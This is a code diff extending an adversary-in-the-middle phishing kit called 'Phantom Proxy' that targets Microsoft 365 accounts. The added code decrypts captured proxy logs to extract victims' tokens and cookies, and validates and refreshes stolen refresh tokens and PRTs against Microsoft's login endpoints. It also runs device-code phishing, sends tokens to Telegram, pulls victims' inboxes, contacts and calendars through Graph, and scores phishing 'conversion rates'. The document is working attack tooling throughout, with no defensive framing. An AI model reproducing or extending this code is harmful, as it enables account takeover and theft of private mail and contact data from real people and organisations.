@@ -1,7 +1,8 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v9.0 — FULL AiTM + DASHBOARD + ALL FEATURES
+// 🥔 PHANTOM PROXY v9.1 — FULL AiTM + DASHBOARD + ALL FEATURES
 // ============================================================
 // 🔥 ONE server: Proxy + Dashboard + Telegram + PRT + Graph + Token Vault + Device Code + Auto-Refresh
+// ✅ ALL Dashboard API endpoints included
 // ============================================================
 
 const http = require("http");
@@ -937,6 +938,59 @@ dashApp.get('/api/device/history', (req, res) => {
     res.json({ success: true, flows: deviceFlows });
 });
 
+// ── DEVICE: Manual Code Generation ──
+dashApp.post('/api/device/manual', async (req, res) => {
+    const { user_code } = req.body;
+    if (!user_code) {
+        return res.status(400).json({ error: 'user_code required' });
+    }
+    try {
+        const clientId = '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
+        const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
+            new URLSearchParams({ client_id: clientId, scope: 'https://graph.microsoft.com/.default offline_access' }),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+        );
+        const data = response.data;
+        const flow = {
+            device_code: data.device_code,
+            user_code: user_code,
+            verification_uri: data.verification_uri,
+            expires_in: data.expires_in,
+            interval: data.interval,
+            status: 'pending',
+            created: new Date().toISOString(),
+            client_id: clientId,
+            session_id: crypto.randomBytes(16).toString('hex'),
+            manual_submitted: true
+        };
+        deviceFlows.push(flow);
+        saveDeviceFlows();
+        res.json({ success: true, flow });
+    } catch (error) {
+        res.status(500).json({ error: error.response?.data || error.message });
+    }
+});
+
+// ── DEVICE: Use Token ──
+dashApp.post('/api/device/use', async (req, res) => {
+    const { session_id } = req.body;
+    if (!session_id) return res.status(400).json({ error: 'session_id required' });
+    try {
+        const flow = deviceFlows.find(f => f.session_id === session_id);
+        if (!flow) return res.status(404).json({ error: 'Flow not found' });
+        if (!flow.access_token) return res.status(400).json({ error: 'No access token available' });
+        res.json({
+            success: true,
+            access_token: flow.access_token,
+            refresh_token: flow.refresh_token,
+            id_token: flow.id_token,
+            username: flow.username || 'Unknown'
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
 // ── Visits ──
 dashApp.get('/api/visits', (req, res) => {
     try {
@@ -945,7 +999,19 @@ dashApp.get('/api/visits', (req, res) => {
         const lines = content.split('\n').filter(line => line.trim());
         const visits = lines.map(line => JSON.parse(line));
         visits.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-        res.json({ visits: visits.slice(0, 100), total: visits.length });
+        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
+        const now = new Date();
+        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
+        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
+        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
+        res.json({
+            visits: visits.slice(0, 100),
+            total: visits.length,
+            uniqueIPs: uniqueIPs,
+            today: todayVisits.length,
+            week: weekVisits.length
+        });
     } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
@@ -1024,6 +1090,42 @@ class TokenVault {
             prt: this.tokens.filter(t => t.type === 'prt').length
         };
     }
+
+    async healthCheckAll() {
+        const results = [];
+        const uniqueTokens = [];
+        const seen = new Set();
+        for (const token of this.tokens) {
+            if (!seen.has(token.value) && token.type === 'access') {
+                seen.add(token.value);
+                uniqueTokens.push(token);
+            }
+        }
+        for (const token of uniqueTokens.slice(0, 10)) {
+            try {
+                const response = await retry(async () => {
+                    return await axios.get('https://graph.microsoft.com/v1.0/me', {
+                        headers: { 'Authorization': `Bearer ${token.value}` },
+                        timeout: 5000
+                    });
+                }, 2, 1000, 2);
+                results.push({
+                    token: token.value.slice(0, 20) + '...',
+                    status: 'valid',
+                    user: response.data.userPrincipalName,
+                    username: token.username
+                });
+            } catch (e) {
+                results.push({
+                    token: token.value.slice(0, 20) + '...',
+                    status: 'invalid',
+                    error: e.message,
+                    username: token.username
+                });
+            }
+        }
+        return results;
+    }
 }
 
 const vault = new TokenVault(LOGS_DIRECTORY, ENCRYPTION_KEY);
@@ -1041,6 +1143,104 @@ dashApp.get('/api/vault/tokens', (req, res) => {
 
 dashApp.get('/api/vault/stats', (req, res) => {
     res.json({ success: true, stats: vault.getStats() });
+});
+
+dashApp.post('/api/vault/healthcheck', async (req, res) => {
+    try {
+        const results = await vault.healthCheckAll();
+        res.json({ success: true, results });
+    } catch (err) { res.status(500).json({ error: err.message }); }
+});
+
+dashApp.post('/api/vault/exchange', async (req, res) => {
+    const { tokenValue } = req.body;
+    if (!tokenValue) return res.status(400).json({ error: 'Token value required' });
+    try {
+        const response = await retry(async () => {
+            return await axios.post(
+                'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                new URLSearchParams({
+                    client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
+                    refresh_token: tokenValue,
+                    grant_type: 'refresh_token',
+                    scope: 'https://graph.microsoft.com/.default offline_access'
+                }),
+                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+            );
+        }, 3, 1000, 2);
+        res.json({ success: true, data: response.data });
+    } catch (err) {
+        res.status(500).json({ error: err.response?.data?.error_description || err.message });
+    }
+});
+
+// ── TOKEN: Get tokens from log file ──
+dashApp.get('/api/tokens/:filename', (req, res) => {
+    const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
+    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Log not found' });
+    try {
+        const content = fs.readFileSync(filePath, 'utf-8');
+        const lines = content.split('\n').filter(line => line.trim());
+        const tokens = {
+            access_tokens: [],
+            refresh_tokens: [],
+            id_tokens: [],
+            prt_tokens: [],
+            cookies: [],
+            sessions: [],
+            username: 'Unknown'
+        };
+        let username = 'Unknown';
+        for (const line of lines) {
+            try {
+                const entry = JSON.parse(line);
+                const iv = Object.keys(entry)[0];
+                const encrypted = entry[iv];
+                const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+                let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
+                decrypted = Buffer.concat([decrypted, decipher.final()]);
+                const obj = JSON.parse(decrypted.toString('utf-8'));
+                const body = obj.proxyRequestBody;
+                if (body) {
+                    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+                    const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
+                    if (accessMatch) tokens.access_tokens.push(decodeURIComponent(accessMatch[1]));
+                    const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
+                    if (refreshMatch) tokens.refresh_tokens.push(decodeURIComponent(refreshMatch[1]));
+                    const idMatch = bodyStr.match(/id_token=([^&]+)/i);
+                    if (idMatch) tokens.id_tokens.push(decodeURIComponent(idMatch[1]));
+                    const prtMatch = bodyStr.match(/prt=([^&]+)/i);
+                    if (prtMatch) tokens.prt_tokens.push(decodeURIComponent(prtMatch[1]));
+                    try {
+                        const parsed = typeof body === 'string' ? JSON.parse(body) : body;
+                        if (parsed.username || parsed.login || parsed.user || parsed.Email) {
+                            username = parsed.username || parsed.login || parsed.user || parsed.Email;
+                        }
+                    } catch (e) {}
+                }
+                if (obj.proxyResponseHeaders && obj.proxyResponseHeaders['set-cookie']) {
+                    const cookieHeaders = obj.proxyResponseHeaders['set-cookie'];
+                    const arr = Array.isArray(cookieHeaders) ? cookieHeaders : [cookieHeaders];
+                    arr.forEach(c => {
+                        const [nameVal] = c.split(';');
+                        if (nameVal) tokens.cookies.push(nameVal);
+                    });
+                }
+            } catch (e) {}
+        }
+        tokens.username = username;
+        // Extract username from tokens
+        if (tokens.access_tokens.length > 0) {
+            try {
+                const parts = tokens.access_tokens[0].split('.');
+                if (parts.length === 3) {
+                    const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
+                    tokens.username = payload.email || payload.preferred_username || payload.upn || tokens.username;
+                }
+            } catch (e) {}
+        }
+        res.json({ success: true, tokens });
+    } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
 // ── Graph API ──
@@ -1069,17 +1269,41 @@ class GraphClient {
     }
 
     async getUserProfile() {
-        return this.get('/me?$select=id,displayName,mail,userPrincipalName');
+        return this.get('/me?$select=id,displayName,mail,userPrincipalName,jobTitle,department,officeLocation,mobilePhone,businessPhones');
+    }
+
+    async getInbox(limit = 50) {
+        return this.get(`/me/mailFolders/inbox/messages?$top=${limit}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`);
+    }
+
+    async getContacts() {
+        return this.get('/me/contacts?$top=100&$select=displayName,emailAddresses,mobilePhone,businessPhones,jobTitle,department');
+    }
+
+    async getEvents(limit = 25) {
+        return this.get(`/me/events?$top=${limit}&$orderby=start/dateTime desc&$select=subject,start,end,location,attendees,organizer,bodyPreview`);
     }
 }
 
 dashApp.post('/api/recon', async (req, res) => {
-    const { accessToken } = req.body;
+    const { accessToken, refreshToken, email } = req.body;
     if (!accessToken) return res.status(400).json({ error: 'Access token required' });
     try {
         const graph = new GraphClient(accessToken);
-        const profile = await graph.getUserProfile();
-        res.json({ success: true, profile });
+        const [profile, inbox, contacts, events] = await Promise.all([
+            graph.getUserProfile(),
+            graph.getInbox(50),
+            graph.getContacts(),
+            graph.getEvents(25)
+        ]);
+        res.json({
+            success: true,
+            email: email || profile.mail || profile.userPrincipalName,
+            profile,
+            inbox: inbox?.value || [],
+            contacts: contacts?.value || [],
+            events: events?.value || []
+        });
     } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
@@ -1127,12 +1351,222 @@ dashApp.post('/api/prt/scan', (req, res) => {
         prtStorage.prts = prts;
         prtStorage.lastScan = new Date().toISOString();
         savePRTStorage();
-        res.json({ success: true, count: prts.length });
+        res.json({ success: true, count: prts.length, prts: prts });
     } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
 dashApp.get('/api/prt/list', (req, res) => {
     res.json({ success: true, prts: prtStorage.prts || [] });
+});
+
+dashApp.post('/api/prt/health', async (req, res) => {
+    const { prt } = req.body;
+    if (!prt) return res.status(400).json({ error: 'PRT required' });
+    try {
+        const response = await retry(async () => {
+            return await axios.post(
+                'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                new URLSearchParams({
+                    client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
+                    grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+                    assertion: prt,
+                    requested_token_use: 'on_behalf_of',
+                    scope: 'https://graph.microsoft.com/.default offline_access'
+                }),
+                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+            );
+        }, 2, 1000, 2);
+        res.json({ success: true, valid: true, data: response.data });
+    } catch (e) {
+        res.json({ success: true, valid: false, error: e.response?.data?.error_description || e.message });
+    }
+});
+
+dashApp.post('/api/prt/health-all', async (req, res) => {
+    try {
+        const results = [];
+        for (const item of prtStorage.prts || []) {
+            try {
+                const response = await retry(async () => {
+                    return await axios.post(
+                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                        new URLSearchParams({
+                            client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
+                            grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+                            assertion: item.prt,
+                            requested_token_use: 'on_behalf_of',
+                            scope: 'https://graph.microsoft.com/.default offline_access'
+                        }),
+                        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+                    );
+                }, 2, 1000, 2);
+                results.push({ username: item.username, valid: true, data: response.data });
+            } catch (e) {
+                results.push({ username: item.username, valid: false, error: e.message });
+            }
+        }
+        res.json({ success: true, results });
+    } catch (err) { res.status(500).json({ error: err.message }); }
+});
+
+dashApp.post('/api/prt/exchange', async (req, res) => {
+    const { prt } = req.body;
+    if (!prt) return res.status(400).json({ error: 'PRT required' });
+    try {
+        const response = await retry(async () => {
+            return await axios.post(
+                'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                new URLSearchParams({
+                    client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
+                    grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+                    assertion: prt,
+                    requested_token_use: 'on_behalf_of',
+                    scope: 'https://graph.microsoft.com/.default offline_access'
+                }),
+                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+            );
+        }, 3, 1500, 2);
+        const tokens = response.data;
+        await sendToTelegram({ sessionId: 'prt_exchange', tokens });
+        res.json({ success: true, data: tokens });
+    } catch (err) {
+        res.status(500).json({ error: err.response?.data || err.message });
+    }
+});
+
+dashApp.post('/api/prt/exchange-all', async (req, res) => {
+    try {
+        const results = [];
+        for (const item of prtStorage.prts || []) {
+            try {
+                const response = await retry(async () => {
+                    return await axios.post(
+                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                        new URLSearchParams({
+                            client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
+                            grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+                            assertion: item.prt,
+                            requested_token_use: 'on_behalf_of',
+                            scope: 'https://graph.microsoft.com/.default offline_access'
+                        }),
+                        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+                    );
+                }, 2, 1000, 2);
+                results.push({
+                    username: item.username,
+                    success: true,
+                    access_token: response.data.access_token?.slice(0, 40) + '...',
+                    refresh_token: response.data.refresh_token?.slice(0, 40) + '...'
+                });
+            } catch (e) {
+                results.push({ username: item.username, success: false, error: e.message });
+            }
+        }
+        res.json({ success: true, results });
+    } catch (err) { res.status(500).json({ error: err.message }); }
+});
+
+dashApp.get('/api/prt/stats', (req, res) => {
+    try {
+        const total = prtStorage.prts?.length || 0;
+        const uniqueUsers = new Set((prtStorage.prts || []).map(p => p.username)).size;
+        const healthy = (prtStorage.prts || []).filter(p => p.last_refresh).length;
+        res.json({
+            success: true,
+            stats: { total, uniqueUsers, healthy, lastScan: prtStorage.lastScan }
+        });
+    } catch (err) { res.status(500).json({ error: err.message }); }
+});
+
+// ── Analytics ──
+dashApp.get('/api/analytics', (req, res) => {
+    try {
+        let visits = [];
+        let captures = [];
+        if (fs.existsSync(VISITS_LOG_FILE)) {
+            const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
+            const lines = content.split('\n').filter(line => line.trim());
+            visits = lines.map(line => JSON.parse(line));
+        }
+        const logFiles = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
+        captures = logFiles.map(f => {
+            const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
+            return { file: f, modified: stat.mtime, size: stat.size };
+        });
+        const now = new Date();
+        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
+        const monthAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
+        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
+        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
+        const monthVisits = visits.filter(v => new Date(v.timestamp) >= monthAgo);
+        const todayCaptures = captures.filter(c => c.modified >= today);
+        const weekCaptures = captures.filter(c => c.modified >= weekAgo);
+        const monthCaptures = captures.filter(c => c.modified >= monthAgo);
+        const conversionRate = {
+            today: todayVisits.length > 0 ? (todayCaptures.length / todayVisits.length * 100).toFixed(1) : 0,
+            week: weekVisits.length > 0 ? (weekCaptures.length / weekVisits.length * 100).toFixed(1) : 0,
+            month: monthVisits.length > 0 ? (monthCaptures.length / monthVisits.length * 100).toFixed(1) : 0,
+            total: visits.length > 0 ? (captures.length / visits.length * 100).toFixed(1) : 0
+        };
+        const dailyCaptures = {};
+        const dailyVisits = {};
+        for (let i = 6; i >= 0; i--) {
+            const d = new Date(now.getTime() - i * 24 * 60 * 60 * 1000);
+            const key = d.toDateString();
+            dailyCaptures[key] = 0;
+            dailyVisits[key] = 0;
+        }
+        captures.forEach(c => {
+            const key = new Date(c.modified).toDateString();
+            if (dailyCaptures.hasOwnProperty(key)) dailyCaptures[key]++;
+        });
+        visits.forEach(v => {
+            const key = new Date(v.timestamp).toDateString();
+            if (dailyVisits.hasOwnProperty(key)) dailyVisits[key]++;
+        });
+        const domains = {};
+        visits.forEach(v => {
+            const url = v.url || '';
+            const match = url.match(/https?:\/\/([^\/]+)/);
+            if (match) {
+                const domain = match[1];
+                domains[domain] = (domains[domain] || 0) + 1;
+            }
+        });
+        const topDomains = Object.entries(domains)
+            .sort((a, b) => b[1] - a[1])
+            .slice(0, 5)
+            .map(([domain, count]) => ({ domain, count }));
+        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
+        res.json({
+            success: true,
+            analytics: {
+                visits: {
+                    total: visits.length,
+                    today: todayVisits.length,
+                    week: weekVisits.length,
+                    month: monthVisits.length
+                },
+                captures: {
+                    total: captures.length,
+                    today: todayCaptures.length,
+                    week: weekCaptures.length,
+                    month: monthCaptures.length
+                },
+                conversionRate,
+                uniqueIPs,
+                dailyCaptures,
+                dailyVisits,
+                topDomains,
+                captureTimeline: captures.map(c => ({
+                    date: c.modified,
+                    file: c.file,
+                    size: c.size
+                }))
+            }
+        });
+    } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
 // ── Auto-Refresh Daemon ──
@@ -1185,7 +1619,7 @@ app.use((req, res) => {
 // ── Start server ──
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ PHANTOM PROXY v9.0 ULTIMATE running on port ${PORT}`);
+    console.log(`✅ PHANTOM PROXY v9.1 ULTIMATE running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${dashUser}/${dashPass})`);
     console.log(`📱 Device Code: /api/device/request`);
     console.log(`🔄 Redirect interception: ACTIVE`);
@@ -1193,5 +1627,6 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🟣 PRT Engine: ACTIVE`);
     console.log(`🔑 Token Vault: ACTIVE`);
     console.log(`📊 Graph API: ACTIVE`);
+    console.log(`📈 Analytics: ACTIVE`);
     console.log(`✅ All features integrated — Complete Ultimate Edition`);
 });
